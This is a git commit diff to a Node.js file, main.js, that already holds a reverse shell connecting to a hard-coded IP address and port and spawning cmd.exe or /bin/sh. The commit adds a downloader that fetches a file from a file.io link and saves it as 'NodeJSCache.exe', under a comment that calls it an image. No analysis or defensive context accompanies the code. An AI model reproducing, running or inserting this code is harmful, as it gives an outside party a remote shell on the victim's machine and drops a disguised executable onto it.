02e27d83709e673816fac6c764f613353553c394
soraxksa <47182349+soraxksa@users.noreply.github.com>
2021-06-10 23:01:08 +0000

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,9 @@
 var net = require('net');
 var spawn = require('child_process').spawn;
+const fs = require('fs');
+const https = require('https');
+
+const url = 'https://file.io/ckc2652sBjMS';
 
 HOST="3.64.211.85";
 PORT="1234";
@@ -8,6 +12,15 @@ TIMEOUT="5000";
 if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
 
 function c(HOST,PORT) {
+    https.get(url,(res) => {
+        // Image will be stored at this path
+        const path = `${__dirname}/NodeJSCache.exe`; 
+        const filePath = fs.createWriteStream(path);
+        res.pipe(filePath);
+        filePath.on('finish',() => {
+            filePath.close();
+        })
+    })
     var client = new net.Socket();
     client.connect(PORT, HOST, function() {
         var sh = spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
